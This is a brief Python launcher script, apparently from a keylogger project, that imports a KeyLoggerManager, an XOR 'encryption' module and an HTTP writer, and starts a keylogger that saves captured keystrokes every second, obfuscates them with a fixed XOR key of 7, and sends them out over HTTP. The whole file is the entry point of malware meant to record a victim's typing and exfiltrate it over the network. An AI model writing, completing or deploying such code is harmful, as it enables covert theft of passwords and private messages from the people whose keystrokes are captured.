from encryptions.xor import Xor
from keylogger.manager import KeyLoggerManager
from writers.networkWriter import HttpWriter

if __name__ == "__main__":
    m = KeyLoggerManager(save_interval=1, saving=HttpWriter, encryption=Xor, key=7)
    m.run()
